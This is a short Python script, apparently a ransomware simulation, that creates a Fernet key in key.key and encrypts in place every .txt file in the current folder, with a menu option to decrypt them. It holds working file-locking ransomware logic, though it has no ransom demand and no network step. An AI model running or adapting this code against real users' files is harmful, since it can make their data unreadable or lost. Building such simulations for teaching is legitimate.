from cryptography.fernet import Fernet
import os

# Function to generate a key and save it
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

# Function to load the key
def load_key():
    return open("key.key", "rb").read()

# Encrypt function
def encrypt_files():
    key = generate_key()
    fernet = Fernet(key)
    for file in os.listdir():
        if file.endswith(".txt") and file != "ransomware_sim.py":
            with open(file, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(file, "wb") as f:
                f.write(encrypted_data)
            print(f"Encrypted {file}")

# Decrypt function
def decrypt_files():
    key = load_key()
    fernet = Fernet(key)
    for file in os.listdir():
        if file.endswith(".txt") and file != "ransomware_sim.py":
            with open(file, "rb") as f:
                data = f.read()
            decrypted_data = fernet.decrypt(data)
            with open(file, "wb") as f:
                f.write(decrypted_data)
            print(f"Decrypted {file}")

# Menu to run functions
if __name__ == "__main__":
    print("1. Encrypt files")
    print("2. Decrypt files")
    choice = input("Choose an option: ")
    if choice == "1":
        encrypt_files()
    elif choice == "2":
        decrypt_files()
    else:
        print("Invalid choice")
